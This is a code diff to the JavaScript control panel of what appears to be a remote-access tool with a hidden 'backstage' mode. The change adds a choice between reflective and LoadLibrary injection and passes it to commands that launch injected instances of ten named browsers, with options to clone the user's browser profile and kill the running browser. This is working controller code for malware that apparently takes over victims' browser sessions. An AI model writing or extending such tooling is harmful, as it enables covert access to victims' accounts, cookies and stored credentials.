@@ -202,6 +202,13 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./generated/s
     if (killIfRunningToggle && typeof settings.killIfRunning === "boolean") {
       killIfRunningToggle.checked = settings.killIfRunning;
     }
+    const injectionMethodSelect = document.getElementById("backstageInjectionMethod");
+    if (injectionMethodSelect && typeof settings.injectionMethod === "string") {
+      const allowed = ["reflective", "loadlibrary"];
+      if (allowed.includes(settings.injectionMethod)) {
+        setSelectValue(injectionMethodSelect, settings.injectionMethod);
+      }
+    }
     applySavedDisplay();
   }
 
@@ -222,7 +229,12 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./generated/s
       cloneProfile: document.getElementById("backstageCloneToggle")?.checked !== false,
       cloneLite: document.getElementById("backstageCloneLiteToggle")?.checked === true,
       killIfRunning: document.getElementById("backstageKillIfRunningToggle")?.checked === true,
+      injectionMethod: readInjectionMethod(),
     };
+  }
+
+  function readInjectionMethod() {
+    return document.getElementById("backstageInjectionMethod")?.value || "reflective";
   }
 
   applySharedSettings(await loadSharedUiSettings("backstage"));
@@ -1830,7 +1842,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./generated/s
     });
   }
 
-  ["backstageCloneToggle", "backstageCloneLiteToggle", "backstageKillIfRunningToggle"].forEach((id) => {
+  ["backstageCloneToggle", "backstageCloneLiteToggle", "backstageKillIfRunningToggle", "backstageInjectionMethod"].forEach((id) => {
     const el = document.getElementById(id);
     if (el) {
       el.addEventListener("change", function () {
@@ -1851,52 +1863,52 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./generated/s
           const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
           const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
           const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
-          sendCmd("backstage_start_browser_injected", { browser: "chrome", clone, cloneLite, killIfRunning });
+          sendCmd("backstage_start_browser_injected", { browser: "chrome", clone, cloneLite, killIfRunning, injectionMethod: readInjectionMethod() });
         } else if (action === "start-brave") {
           const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
           const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
           const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
-          sendCmd("backstage_start_browser_injected", { browser: "brave", clone, cloneLite, killIfRunning });
+          sendCmd("backstage_start_browser_injected", { browser: "brave", clone, cloneLite, killIfRunning, injectionMethod: readInjectionMethod() });
         } else if (action === "start-edge") {
           const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
           const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
           const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
-          sendCmd("backstage_start_browser_injected", { browser: "edge", clone, cloneLite, killIfRunning });
+          sendCmd("backstage_start_browser_injected", { browser: "edge", clone, cloneLite, killIfRunning, injectionMethod: readInjectionMethod() });
         } else if (action === "start-firefox") {
           const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
           const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
           const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
-          sendCmd("backstage_start_browser_injected", { browser: "firefox", clone, cloneLite, killIfRunning });
+          sendCmd("backstage_start_browser_injected", { browser: "firefox", clone, cloneLite, killIfRunning, injectionMethod: readInjectionMethod() });
         } else if (action === "start-opera") {
           const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
           const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
           const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
-          sendCmd("backstage_start_browser_injected", { browser: "opera", clone, cloneLite, killIfRunning });
+          sendCmd("backstage_start_browser_injected", { browser: "opera", clone, cloneLite, killIfRunning, injectionMethod: readInjectionMethod() });
         } else if (action === "start-operagx") {
           const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
           const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
           const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
-          sendCmd("backstage_start_browser_injected", { browser: "operagx", clone, cloneLite, killIfRunning });
+          sendCmd("backstage_start_browser_injected", { browser: "operagx", clone, cloneLite, killIfRunning, injectionMethod: readInjectionMethod() });
         } else if (action === "start-vivaldi") {
           const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
           const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
           const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
-          sendCmd("backstage_start_browser_injected", { browser: "vivaldi", clone, cloneLite, killIfRunning });
+          sendCmd("backstage_start_browser_injected", { browser: "vivaldi", clone, cloneLite, killIfRunning, injectionMethod: readInjectionMethod() });
         } else if (action === "start-yandex") {
           const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
           const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
           const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
-          sendCmd("backstage_start_browser_injected", { browser: "yandex", clone, cloneLite, killIfRunning });
+          sendCmd("backstage_start_browser_injected", { browser: "yandex", clone, cloneLite, killIfRunning, injectionMethod: readInjectionMethod() });
         } else if (action === "start-waterfox") {
           const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
           const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
           const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
-          sendCmd("backstage_start_browser_injected", { browser: "waterfox", clone, cloneLite, killIfRunning });
+          sendCmd("backstage_start_browser_injected", { browser: "waterfox", clone, cloneLite, killIfRunning, injectionMethod: readInjectionMethod() });
         } else if (action === "start-arc") {
           const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
           const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
           const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
-          sendCmd("backstage_start_browser_injected", { browser: "arc", clone, cloneLite, killIfRunning });
+          sendCmd("backstage_start_browser_injected", { browser: "arc", clone, cloneLite, killIfRunning, injectionMethod: readInjectionMethod() });
         } else if (action === "start-custom") {
           hideContextMenu();
           showCustomExeModal();
